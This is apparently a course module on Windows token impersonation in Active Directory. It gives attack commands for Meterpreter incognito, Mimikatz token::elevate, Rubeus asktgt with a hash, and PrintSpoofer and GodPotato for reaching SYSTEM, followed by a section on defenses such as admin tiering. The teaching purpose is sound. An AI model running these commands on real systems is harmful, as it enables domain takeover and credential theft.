# Token Impersonation

## Unit 5 - Topic 2 | Privilege Escalation in AD

---

## Overview

**Token impersonation** exploits Windows access tokens to assume the identity of another user or process. In AD environments, if a privileged user (like Domain Admin) has an active token on a compromised machine, an attacker with local admin can steal that token and operate as that user.

---

## 1. Windows Access Tokens

```
TOKEN TYPES:

PRIMARY TOKEN:
├── Assigned to a process at creation
├── Represents the security context of the process
├── One primary token per process
└── Contains: User SID, Group SIDs, Privileges

IMPERSONATION TOKEN:
├── Represents the client's identity in client-server
├── Created when a user accesses a network service
├── Can be at different impersonation levels
└── Levels:
    ├── Anonymous      — No identity information
    ├── Identification — Can identify but not impersonate
    ├── Impersonation  — Can impersonate locally
    └── Delegation     — Can impersonate on remote systems

SECURITY CONTEXT FLOW:
┌──────────┐   Token attached    ┌─────────┐
│ User     │ ─────────────────→ │ Process │
│ (DA)     │   to process       │ (cmd)   │
│ Logs in  │                    │         │
│ to host  │   Impersonation    │         │
│          │   token created    │         │
│          │ ─────────────────→ │ Service │
└──────────┘                    └─────────┘
              Attacker steals      ↓
              token from process   ↓
              → Becomes DA!        ↓
```

---

## 2. Token Impersonation with Incognito

```bash
# === INCOGNITO (Standalone or Meterpreter) ===

# Meterpreter:
meterpreter> load incognito
meterpreter> list_tokens -u
# Lists available tokens:
# Delegation Tokens Available:
#   CORP\Administrator
#   CORP\Domain Admin
#   NT AUTHORITY\SYSTEM
#
# Impersonation Tokens Available:
#   CORP\svc_sql

# Impersonate a token:
meterpreter> impersonate_token "CORP\\Domain Admin"
# Now operating as Domain Admin!

# Verify:
meterpreter> getuid
# Server username: CORP\Domain Admin

# === STANDALONE INCOGNITO ===
# List tokens:
incognito.exe list_tokens -u

# Impersonate:
incognito.exe execute -c "CORP\Administrator" cmd.exe
# Opens cmd as Administrator

# === REQUIREMENTS ===
# Need: Local admin or SYSTEM on the target machine
# Target user must have active session (logged in/service running)
# SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
```

---

## 3. Token Theft with Mimikatz

```bash
# === MIMIKATZ TOKEN MANIPULATION ===
# Requires: Administrator or SYSTEM

# Elevate to SYSTEM token:
privilege::debug
token::elevate
# Now running as NT AUTHORITY\SYSTEM

# Elevate to specific user:
token::elevate /domainadmin
# Finds and impersonates a Domain Admin token

# List all tokens:
token::list

# Revert to original token:
token::revert

# === PROCESS TOKEN THEFT ===
# Find process running as target user:
tasklist /v | findstr "domain_admin"
# or:
Get-Process | select ProcessName, Id, @{N='User';E={$_.GetOwner().User}}

# Mimikatz — steal token from specific process:
token::elevate /id:PID_OF_TARGET_PROCESS

# === RUBEUS — REQUEST NEW TOKEN ===
# If you have the user's hash/ticket:
.\Rubeus.exe asktgt /user:da_user /rc4:HASH /ptt
# Creates new token via Kerberos
```

---

## 4. Token Impersonation via Potato Attacks

```bash
# === SERVICE ACCOUNT → SYSTEM VIA TOKEN ===
# Service accounts often have SeImpersonatePrivilege
# This allows creating tokens for SYSTEM

# Check current privileges:
whoami /priv
# Look for:
# SeImpersonatePrivilege      Enabled
# SeAssignPrimaryTokenPrivilege  Enabled

# === PRINTSPOOFER ===
.\PrintSpoofer.exe -i -c "cmd.exe"
# Impersonates SYSTEM token via print spooler pipe
# Fast and reliable on modern Windows

# === GODPOTATO ===
.\GodPotato.exe -cmd "cmd /c whoami"
# Latest generation, broadest compatibility

# === AFTER GETTING SYSTEM TOKEN ===
# Can now:
# 1. Access LSASS → dump all credentials
# 2. Create admin accounts
# 3. Modify services/registry
# 4. Access any local file
# 5. Impersonate any local or cached user
```

---

## 5. Defense Against Token Impersonation

| Defense | Description |
|---------|-------------|
| **Limit DA logins** | Don't log into workstations as DA |
| **Admin tiering** | Tier 0/1/2 admin accounts for different systems |
| **Clear tokens** | Log off properly (don't just close RDP) |
| **Credential Guard** | Isolates LSASS in hypervisor |
| **Restrict SeImpersonate** | Remove from unnecessary accounts |
| **Protected Users** | Blocks delegation tokens for group members |
| **Monitor** | Track token manipulation events (Event 4624 Type 9/10) |

```
ADMIN TIERING MODEL:

TIER 0: Domain Controllers, AD admins
├── Tier 0 admin accounts
├── ONLY used on Tier 0 systems
├── NEVER log into workstations
└── Protected by PAW (Privileged Access Workstations)

TIER 1: Servers, applications
├── Tier 1 admin accounts
├── ONLY used on servers
└── NEVER used on workstations

TIER 2: Workstations, end-user devices
├── Tier 2 admin accounts (helpdesk)
├── ONLY used on workstations
└── NEVER used on servers or DCs

RESULT: Even if Tier 2 is compromised,
        no DA tokens to steal!
```

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Token impersonation** | Steal another user's security token |
| **Requirement** | Local admin + target user's active session |
| **Incognito** | Meterpreter module for token listing/theft |
| **Mimikatz** | token::elevate for privilege escalation |
| **Potato attacks** | SeImpersonatePrivilege → SYSTEM token |
| **Best defense** | Admin tiering (DAs never log into workstations) |

---

## Quick Revision Questions

1. **What is the difference between primary and impersonation tokens?**
2. **What privilege is required for token impersonation?**
3. **How does admin tiering prevent token theft attacks?**
4. **How do you list available tokens in Meterpreter?**
5. **What happens when a DA logs into a compromised workstation?**

---

[← Previous: Local Privilege Escalation](01-local-privilege-escalation.md) | [Next: Misconfigured Permissions →](03-misconfigured-permissions.md)

---

*Unit 5 - Topic 2 of 5 | [Back to README](../README.md)*
